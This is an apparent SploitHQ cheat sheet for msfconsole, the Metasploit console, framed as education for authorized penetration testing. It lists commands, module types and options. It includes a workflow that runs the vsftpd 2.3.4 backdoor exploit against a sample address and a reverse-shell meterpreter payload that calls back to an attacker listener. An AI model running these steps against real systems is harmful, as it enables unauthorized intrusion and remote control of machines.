# msfconsole – Metasploit Framework Console Interface

**msfconsole** is the primary command-line interface to the **Metasploit Framework**, a powerful platform for developing, testing, and executing exploits against remote targets. It provides access to thousands of modules, including exploits, payloads, post-exploitation tools, scanners, and more.

🔗 [Explore msfconsole Usage on SploitHQ](https://sploithq.com/msfconsole)

---

## 🔍 What Is msfconsole?

- Core interface to the Metasploit Framework
- Supports scripting, automation, and interactive shell usage
- Enables launching exploits, creating payloads, and managing sessions
- Ideal for red teaming, pentesting, and vulnerability validation

---

## ⚙️ Basic Usage

```bash
msfconsole
```

Once inside the console, you can search, configure, and run modules interactively.

---

## 🧰 Common Commands

| Command                        | Description                                      |
|-------------------------------|--------------------------------------------------|
| `search <term>`               | Search for exploits, payloads, or modules        |
| `use <module_path>`           | Load a module (e.g., exploit/windows/smb/ms17_010_eternalblue) |
| `info`                        | Show detailed info about a loaded module         |
| `set <option> <value>`        | Set required options (e.g., RHOSTS, PAYLOAD)     |
| `run` or `exploit`            | Launch the exploit                              |
| `sessions`                    | List active sessions                            |
| `background`                  | Background the current session                  |
| `exit`                        | Quit the msfconsole                             |

---

## 🧪 Example Workflow

```bash
msfconsole
```

```text
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
set RPORT 21
run
```

---

## 🔥 Payload Example

Set a reverse shell payload:
```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
```

---

## 📦 Module Types

- `exploit/` – Attack modules
- `auxiliary/` – Scanners, fuzzers, etc.
- `payload/` – Shellcode and Meterpreter payloads
- `post/` – Post-exploitation tools
- `encoder/` – Payload obfuscation
- `nop/` – No-operation generators

---

## ⚙️ Useful Options

| Option           | Description                                 |
|------------------|---------------------------------------------|
| `-q`             | Quiet mode (no banner)                      |
| `-r <script.rc>` | Run commands from a resource script         |
| `-x "<cmd>"`     | Execute a single command and exit           |
| `-h`             | Show help                                   |

---

## 🌐 SploitHQ Metasploit Guide

👉 [Launch Your First Exploit with msfconsole](https://sploithq.com/msfconsole)

- Step-by-step exploit examples
- Post-exploitation tips
- Meterpreter and persistence tricks

---

## 🔗 Useful Links

- [Metasploit Framework GitHub](https://github.com/rapid7/metasploit-framework)
- [Metasploit Unleashed (OffSec)](https://www.offensive-security.com/metasploit-unleashed/)
- [SploitHQ msfconsole Page](https://sploithq.com/msfconsole)

---

## 📄 License

Metasploit is open source and maintained by Rapid7 under a BSD-style license.  
This documentation is provided by [SploitHQ](https://sploithq.com) for educational and authorized testing purposes only.
